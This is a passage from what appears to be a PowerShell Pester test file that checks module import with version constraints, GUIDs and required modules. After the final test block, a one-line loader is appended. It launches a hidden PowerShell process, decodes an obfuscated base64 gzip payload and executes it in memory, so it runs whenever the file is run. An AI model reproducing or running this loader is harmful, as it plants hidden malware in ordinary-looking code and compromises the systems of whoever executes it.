        $modSpec = New-ModuleSpecification -ModuleName $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        $mod = Get-Module -FullyQualifiedName $modSpec

        $mod | Should -Be $null
    }

    It "Does not load the module with FullyQualifiedName from absolute path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidFailCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $modulePath -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        { Import-Module -FullyQualifiedName $modSpec -ErrorAction Stop } | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    It "Does not load the module with FullyQualifiedName from the module path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidFailCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        { Import-Module -FullyQualifiedName $modSpec -ErrorAction Stop } | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    It "Does not load the module with FullyQualifiedName from the manifest when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidFailCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $manifestPath -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        { Import-Module -FullyQualifiedName $modSpec -ErrorAction Stop } | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    It "Does not load the module with version constraints from absolute path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $failCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $sb = {
            Invoke-ImportModule -Module $modulePath -MinimumVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion
        }

        if ($ModuleVersion -and $MaximumVersion -and ($ModuleVersion -ge $MaximumVersion))
        {
            $sb | Should -Throw -ErrorId 'ArgumentOutOfRange,Microsoft.PowerShell.Commands.ImportModuleCommand'
            return
        }
        $sb | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    It "Does not load the module with version constraints from the module path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $failCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $sb = {
            Invoke-ImportModule -Module $modulePath -MinimumVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion
        }

        if ($ModuleVersion -and $MaximumVersion -and ($ModuleVersion -ge $MaximumVersion))
        {
            $sb | Should -Throw -ErrorId 'ArgumentOutOfRange,Microsoft.PowerShell.Commands.ImportModuleCommand'
            return
        }
        $sb | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    It "Does not load the module with version constraints from the manifest when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $failCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $sb = {
            Invoke-ImportModule -Module $modulePath -MinimumVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion
        }

        if ($ModuleVersion -and $MaximumVersion -and ($ModuleVersion -ge $MaximumVersion))
        {
            $sb | Should -Throw -ErrorId 'ArgumentOutOfRange,Microsoft.PowerShell.Commands.ImportModuleCommand'
            return
        }
        $sb | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    Context "Required modules" {
        BeforeAll {
            $reqModName = 'ReqMod'
            $reqModPath = Join-Path $TestDrive "$reqModName.psd1"
        }

        AfterEach {
            Get-Module $reqModName | Remove-Module
        }

        It "Successfully loads a module when the required module has ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>" -TestCases $successCases {
            param($ModuleVersion, $MaximumVersion, $RequiredVersion)

            $modSpec = New-ModuleSpecification -ModuleName $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion
            New-ModuleManifest -Path $reqModPath -RequiredModules $modSpec
            $reqMod = Import-Module $reqModPath -PassThru

            $reqMod | Should -Not -Be $null
            $reqMod.Name | Should -Be $reqModName
        }

        It "Does not load a module when the required module has ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>" -TestCases $failCases {
            param($ModuleVersion, $MaximumVersion, $RequiredVersion)

            $modSpec = New-ModuleSpecification -ModuleName $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion
            New-ModuleManifest -Path $reqModPath -RequiredModules $modSpec
            { Import-Module $reqModPath -ErrorAction Stop } | Should -Throw -ErrorId "Modules_InvalidManifest,Microsoft.PowerShell.Commands.ImportModuleCommand"
        }
    }
}

if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIALvNCVgCA7VWf2/aPBD+u5P2HaIJiUSjhF9ru0qTXoeQQiEtNBAKDE1u4gSDE7PEocC27/5egKxU66a+k96oFXbuznd+7rm7eEnoCMpDyQu2yzNzKH17++akiyMcSHKON/3qF7cg5dbJ3KjiTaycnIA4N++PDE/6JMkTtFzqPMA0nF5e1pMoIqHY74tXRKA4JsEDoySWFem7NJyRiJzePsyJI6RvUu5L8YrxB8wOaps6dmZEOkWhm8o63MFpYEVryaiQ858/55XJaXlabHxNMIvlvLWJBQmKLmN5RfqhpA77myWR8yZ1Ih5zTxSHNKxWioMwxh65gdNWxCRixt04r8A14C8iIolCaX+h9IS9XM7DshtxB7luRGJQL7bCFV8QORcmjBWkf+TJwf1dEgoaEJALEvGlRaIVdUhcbOLQZeSOeFP5hjxmt36tkXxsBFpdESkFSMhLcZrcTRjZm+aVXyM9ZFGB5ziTgMCPt2/evvEyAoRidn7nG5X+MQVgdTLZrQmEKnd5THfKn6RSQTLBJxY82sA2148SokylSZqDyXQq5eKg8qFc+P0B5UwbdGeOveBni023rddANLE5dadgekhTLnxoaBdnO9HvGacTj4ZE34Q4oE5GKvkl+InHyO7SxUztBuKT8wcBcXXCiI9FimdBmvxq1gio+GmrJZS5JEIOpDCGqCC7yvNg9imS863QJAHgtd/nIR0eUJlk2gf6bjLv6R6U8nWG47ggdROoJacgWQQzAlWJwpgeRCgRfLfMP4VrJkxQB8ciO26qHEF5cFnnYSyixIEswvX71pI4FLMUjYLUpC7RNhb1M9f5F7GoY8Zo6MNJK8gFvEkxsETKjSjtHTseKEWLiFawZCQApV1hGwz7UMaHWtixCfvEzb8QZcb2PbVTSDIsjmKEPFuMi4Jk00hAi0jhPebVX4Zy1CWyoOoROWRHzqpoom1ESvscGSy+uClPD0DtYIkEQGJEPNBwTM5qlogAMPmdekvrCJ5RK2Smoy1oGT3ScsuE/wGttrh+7rav50010tczD7Xiltns6r1ms7a6tuyasBot0e62hNm4n88t1LwbjMS4hZp9WlqMatvlNd1aHeSO1urZVts+lrT1du673kj3PP/cs+7KHwzaGdZ7WqmCO3oj6Qy1R61Uixv0sdmjg97i2hAPI5vhgaf69+WPmK470dwuc3PbQuhqVnW21559NTPdzaipfhzWFqiBUD1s2IbG2yMtQl3Vxr7NH9u+hgO/jjTHpGTcGxhar2doaHA1/6p/VH2wvcczbWhX6Hh5fzeDvQEhtNVSreWSLR/1AKQrjrB/Bzp+veLMPNDR3yPt/Q2PK3ihcaSBjjH+CnGNlkaXgbw/qHBks5t7jDrjjaGq5VG3hpolOrzyUXok9rUeRvFK3+pq2Xa5O/xwM/JU+56dq3q9v3Q8VVUfm3rbGZfXF7fnF50htQOOBqpqv0u5AeTIra7rTWsUxPNqu32U99+1eBNH8Qwz4AO07qwyDR4Zhzbc5TS1kOVsHi9IFBIGYwwGXUZtxBh30oHw1LNhIu3nxBSKdADLauXFlSL9VFSehkX26vJyDNFCpexoXOyQ0BezQmldLZWg35fWtRJc+/VXrPPlRt6fVUgHxjOwfnphOy9KWka5xW27c726GI6H/zuWhyqewY/7Kiyf3v1B+ip8S4XnSPwifv7iP2H+N1AMMRWgbEFXYmQ/K/+AyIFIR58aT1kDrniHJ/3ku03E6Q18h/wLKT6J7mYKAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

